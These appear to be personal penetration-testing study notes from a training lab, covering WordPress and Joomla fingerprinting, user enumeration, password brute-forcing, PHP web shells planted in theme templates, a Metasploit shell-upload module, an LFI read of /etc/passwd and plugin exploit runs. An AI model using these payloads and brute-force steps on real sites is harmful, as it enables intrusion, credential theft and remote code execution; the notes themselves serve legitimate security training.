## WordPress - Discovery & Enumeration
WordPress is a widely-used PHP CMS (runs on Apache + MySQL). Its huge number of plugins/themes creates a large attack surface, with most vulnerabilities coming from third-party components. During pentests, WordPress is easy to identify and enumerate through its directory structure, metadata, plugins, themes, and exposed files.
#### Discovery / Footprinting
- Check **/robots.txt**, **/wp-admin**, **/wp-content** to confirm WordPress.
```bash
# check robots and homepage
curl -s http://blog.inlanefreight.local/robots.txt
  # User-agent: *
  # Disallow: /wp-admin/
  # Allow: /wp-admin/admin-ajax.php
  # Disallow: /wp-content/uploads/wpforms/
  # Sitemap: https://inlanefreight.local/wp-sitemap.xml
```
 - **wp-admin** redirects to **wp-login.php** (login portal).
 ![[Pasted image 20251127192744.png]]
 Plugins in **wp-content/plugins**, and themes in **wp-content/themes**.

- There are five types of users on a standard WordPress installation :
1. Administrator: This user has access to administrative features within the website. This includes adding and deleting users and posts, as well as editing source code.
2. Editor: An editor can publish and manage posts, including the posts of other users.
3. Author: They can publish and manage their own posts.
4. Contributor: These users can write and manage their own posts but cannot publish them.
5. Subscriber: These are standard users who can browse posts and edit their profiles.

Getting access to an administrator is usually sufficient to obtain code execution on the server. Editors and authors might have access to certain vulnerable plugins, which normal users don’t.
#### Enumeration

- **View page source or use `curl | grep WordPress` to find version, theme, plugins.**
```bash
# find WordPress version
curl -s http://blog.inlanefreight.local | grep WordPress
  # <meta name="generator" content="WordPress 5.8" />
```
==find **WordPress 5.8**==
- ** inspect themes and plugins.**
```bash
# find theme references
curl -s http://blog.inlanefreight.local/ | grep themes
# <link ... href='http://blog.inlanefreight.local/wp-content/themes/business-gravity/.../bootstrap.min.css' ... />

# find plugin references
curl -s http://blog.inlanefreight.local/ | grep plugins
# <link ... href='http://blog.inlanefreight.local/wp-content/plugins/contact-form-7/includes/css/styles.css?ver=5.4.2' ... />
# <script ... src='http://blog.inlanefreight.local/wp-content/plugins/mail-masta/lib/subscriber.js?ver=5.8' ... />
```
==find **contact-form-7 , mail-masta** plugins== 
- **try find the plugins version (mail-masta)  by read`readme.txt` often leaks plugin versions.**
```bash
# list plugin dir (if enabled)
curl -s http://blog.inlanefreight.local/wp-content/plugins/mail-masta/
  # readme.txt  --> 

# # show readme (fingerprint plugins version)
curl -s http://blog.inlanefreight.local/wp-content/plugins/mail-masta/readme.txt
  # Stable tag: 1.0 (so it mean mail-masta version 1.0)
  
# do same to detect the version to all other plugins:
curl -s http://blog.inlanefreight.local/wp-content/plugins/contact-form-7/readme.txt #-> Stable tag: 5.4.2
# ...  
```
==find **mail-masta version 1.0**which suffers from a [Local File Inclusion](https://www.exploit-db.com/exploits/50226) vulnerability that was published in August of 2021.==
 - inspect  plugins in another page 
```bash
 curl -s http://blog.inlanefreight.local/?p=1 | grep plugins
# <link rel='stylesheet' id='wpdiscuz-frontend-css-css'  href='http://blog.inlanefreight.local/wp-content/plugins/wpdiscuz/themes/default/style.css?ver=7.0.4'
```
==find **wpdiscuz** plugin and it appears to be version 7.0.4 and A quick search for this plugin version shows [this](https://www.exploit-db.com/exploits/49967) unauthenticated remote code execution vulnerability==

- at the end of the Manuel enum findings:
    -  find **WordPress 5.8**
    - Theme: **Business Gravity**
    - Plugins: **Contact Form 7, mail-masta 1.0  (==LFI==), wpDiscuz 7.0.4 (==RCE==).**
#### Enumerating Users

- **wp-login.php** leaks valid usernames by error messages:
![[Pasted image 20251127204912.png]]
    - Valid user + wrong pass → “password incorrect”
    - Invalid user → “user not registered”
- This allows username enumeration (e.g., **admin** confirmed).
    

#### WPScan (auto enum)
Automated WordPress scanner that detects: versions, plugins, themes, users, vulnerabilities.
- Supports WPVulnDB API token for vulnerability info.
- `--enumerate` flag lists plugins, themes, users, backups, etc.
```bash
sudo wpscan --url http://blog.inlanefreight.local --enumerate --api-token dEOFB<SNIP>
# [+] URL: http://blog.inlanefreight.local/ [10.129.42.195]
# [+] XML-RPC seems to be enabled: http://blog.inlanefreight.local/xmlrpc.php
# [+] WordPress version 5.8 identified (Insecure, released on 2021-07-20).
# [!] 3 vulnerabilities identified for core (fixed in 5.8.1)
# [+] Plugin found: mail-masta (version 1.0) -> LFI, SQLi
# [+] Theme found: transport-gravity (child of Business Gravity)
# [+] Users found: admin, john
# [+] Upload directory listing enabled on /wp-content/uploads/....
```
- Scan results confirmed:
    - WordPress version 5.8 (vulnerable)
    - Theme: Transport Gravity (child of Business Gravity)
    - Plugins: mail-masta (with LFI, SQLi)
    - Users: admin, by, john
    - XML-RPC enabled, directory listing enabled
- WPScan may miss some plugins(i==t miss wpDiscuz==), so manual + automated enumeration is required.
#### Moving On
From the data we gathered manually and using WPScan, we now know the following:

main:
- WordPress 5.8 -> which does suffer from some vulnerabilities that do not seem interesting at this point
- The installed theme is Transport Gravity

Plugin: 
- wpdiscuz 7.0.4 ->  Remote Code Execution + Arbitrary File Upload
- wp-sitemap-page 1.6.4 ->  Stored XSS
- contact-form-7 5.4.2 -> no public vlun found 
- mail-masta 1.0 ->  Local File Inclusion + SQL Injection 

others : 
- The WordPress site is vulnerable to user enumeration, and the users admin and john are confirmed to be valid users
- Directory listing is enabled throughout the site, which may lead to sensitive data exposure
XML-RPC is enabled, which can be leveraged to perform a password brute-forcing attack against the login page using WPScan, Metasploit, etc.

With this information noted down, let's move on to the fun stuff: attacking WordPress!


---

## 1- Attacking WordPress  
WordPress can be attacked by abusing built-in features: brute-forcing login credentials, using the theme editor for RCE, leveraging Metasploit, and exploiting vulnerable plugins.
#### Login Bruteforce  
WPScan can brute-force WordPress users (via `xmlrpc` or `wp-login`).  
Example attack:
```bash
sudo wpscan --password-attack xmlrpc -t 20 -U john -P /usr/share/wordlists/rockyou.txt --url http://blog.inlanefreight.local
# output shows valid creds: john / firebird1
```

Flags:  
- `--password-attack` → attack type  
- `-U` users list  
- `-P` passwords list  
- `-t` threads  
#### Code Execution
After logging in as admin,Click on `Appearance` on the side panel and select Theme Editor. This page will let us edit the PHP source code directly. An inactive theme  (ex: Twenty Nineteen) can be selected to avoid corrupting the primary theme  and insert a simple web shell in `404.php`:
![[Pasted image 20251130193933.png]]
```php
system($_GET[0]);
```

Execute commands:
```bash
curl http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php?0=id
```


 ##### Using Metasploit
Metasploit module uploads a malicious plugin and triggers a Meterpreter shell.
```bash
msf6 > use exploit/unix/webapp/wp_admin_shell_upload
set username john
set password firebird1
set lhost 10.10.14.15
set rhost 10.129.42.195
set VHOST blog.inlanefreight.local

# Check options:
show options

# Exploit:
exploit # Meterpreter session opens
```

Artifacts must be cleaned and reported.
### Leveraging Known Vulnerabilities  
Most WordPress vulnerabilities come from plugins (89%). Old, unused plugins may expose exploitable flaws.
```bash
searchsploit WordPress 5.4
```
#### Vulnerable Plugin: mail-masta  
Contains LFI and SQL injection. Vulnerable code allows arbitrary file inclusion:
```php
<?php 

include($_GET['pl']);
global $wpdb;

$camp_id=$_POST['camp_id'];
$masta_reports = $wpdb->prefix . "masta_reports";
$count=$wpdb->get_results("SELECT count(*) co from  $masta_reports where camp_id=$camp_id and status=1");

echo $count[0]->co;

?>
```
As we can see, the `pl` parameter allows us to include a file without any type of input validation or sanitization
lfi endpoint : `/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd`
Exploit LFI:
```bash
curl -s http://blog.inlanefreight.local/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
# outputs /etc/passwd
```
####  Vulnerable Plugins - wpDiscuz
Version 7.0.4 allows bypassing file-type checks to upload a PHP shell.

Exploit:
```bash
python3 wp_discuz.py -u http://blog.inlanefreight.local -p /?p=1
# -p the path to a valid post.
# [+] Upload Success... Webshell Webshell path:url&quot;:&quot;http://blog.inlanefreight.local/wp-content/uploads/2021/08/uthsdkbywoxeebg-1629904090.8191.php&quot; 

# > id
# [x] Failed to execute PHP code...
```
The exploit as written may fail, but we can use `cURL` to execute commands using the uploaded web shell. We just need to append `?cmd=` after the `.php` extension to run commands which we can see in the exploit script.

Execute commands manually:
```bash
 curl -s http://blog.inlanefreight.local/wp-content/uploads/2021/08/uthsdkbywoxeebg-1629904090.8191.php?cmd=id
```
Cleanup of uploaded files is required.

---

## 2- Joomla – Discovery & Enumeration  
Joomla is a popular PHP-based CMS. During assessments we fingerprint Joomla, identify its version, discover plugins/components, and check for weak admin credentials.
Query Joomla installation statistics:
```bash
curl -s https://developer.joomla.org/stats/cms_version | python3 -m json.tool
    # Shows version breakdown + total installs
```
#### Discovery/Footprinting
Look for Joomla indicators in page source.
```bash
curl -s http://dev.inlanefreight.local/ | grep Joomla
    # <meta name="generator" content="Joomla! ...">
````

Check `robots.txt` for typical Joomla paths.
```bash
# Joomla robots.txt example (common paths like /administrator/, /plugins/, /modules/)

# If the Joomla site is installed within a folder
# eg www.example.com/joomla/ then the robots.txt file
# MUST be moved to the site root
# eg www.example.com/robots.txt
# AND the joomla folder name MUST be prefixed to all of the
# paths.
# eg the Disallow rule for the /administrator/ folder MUST
# be changed to read
# Disallow: /joomla/administrator/
#
# For more information about the robots.txt standard, see:
# https://www.robotstxt.org/orig.html

User-agent: *
Disallow: /administrator/
Disallow: /bin/
....
```

Fingerprint version using `README.txt`:
```bash
curl -s http://dev.inlanefreight.local/README.txt | head -n 5
    # Shows Joomla 3.x info
```

Fingerprint via JavaScript files in the `media/system/js/` directory or by browsing to `administrator/manifests/files/joomla.xml`.:
```bash
curl -s http://dev.inlanefreight.local/administrator/manifests/files/joomla.xml | xmllint --format -
    # <version>3.9.4</version>
```

The `cache.xml` file can help to give us the approximate version. It is located at `plugins/system/cache/cache.xml`.
## Enumeration 
##### Using droopescan
```bash
# Install:
sudo pip3 install droopescan

# Run scan:
droopescan scan joomla --url http://dev.inlanefreight.local/
    # Shows possible versions (3.8.x)
    # Lists interesting URLs like joomla.xml, LICENSE.txt, cache.xml
```
##### Using JoomlaScan
Install Python2.7 (if needed):
```bash
curl https://pyenv.run | bash
echo 'export PYENV_ROOT="$HOME/.pyenv"' >> ~/.bashrc
echo 'command -v pyenv >/dev/null || export PATH="$PYENV_ROOT/bin:$PATH"' >> ~/.bashrc
echo 'eval "$(pyenv init -)"' >> ~/.bashrc
source ~/.bashrc
pyenv install 2.7
pyenv shell 2.7

# Install dependencies:
python2.7 -m pip install urllib3 certifi bs4
```
Run JoomlaScan:
```bash
python2.7 joomlascan.py -u http://dev.inlanefreight.local
    # Finds components (com_actionlogs, com_admin, etc.)
    # Finds explorable directories
```
#### Admin Portal & Brute Force
Administrator login:
```
http://dev.inlanefreight.local/administrator/index.php
```
Error message is generic (no enumeration): `Warning: Username and password do not match...`
Default Joomla admin user = **admin**.

**Brute force the admin login:**
 We can use this script to attempt to brute force the login.
```bash
sudo python3 joomla-brute.py -u http://dev.inlanefreight.local \
  -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt \
  -usr admin
  # admin:admin
```
Valid credentials discovered: **admin / admin**.

---


## 3- Attacking Joomla

#### Abusing Built-In Functionality

- After logging into Joomla admin (credentials may be leaked or weak like `admin:admin`), attackers can modify templates to gain RCE.
>If you receive an error stating "An error has occurred. Call to a member function format() on null" after logging in, navigate to "http://dev.inlanefreight.local/administrator/index.php?option=com_plugins" and disable the "Quick Icon - PHP Version Check" plugin. This will allow the control panel to display properly.
- Navigate to: **Templates → Protostar → error.php**
![[Pasted image 20251202142045.png]]
- Add malicious PHP code such as:
```php
system($_GET['cmd']);
```

- Trigger RCE:
```bash
curl -s http://target/templates/protostar/error.php?cmd=id
```
- After gaining shell, escalate to a reverse shell, privilege escalate, or pivot internally.
- Always remove webshells and document file names/hashes for reporting.

#### Leveraging Known Vulnerabilities
```bash
searchsploit Joomla 3.9.4
```
- Joomla has **426+ CVEs**, many affecting extensions rather than core.
- Joomla **3.9.4** (target version) is vulnerable to **CVE-2019-10945**: Authenticateddirectory traversal + authenticated file deletion.


    
- The exploits :
    - **CVE-2019-10945**  Authenticated Listing  arbitrary directories  () exploit for python3  can be found [here](https://github.com/dpgg101/CVE-2019-10945).)
    - Authenticated Deleting files (dangerous not typically used in real pentests)

arbitrary directories  exploit Example usage:
```bash
python2.7 joomla_dir_trav.py --url "http://target/administrator/" --username admin --password admin --dir /
```
Can reveal sensitive files (configs, scripts with credentials) if webserver user permissions allow it.
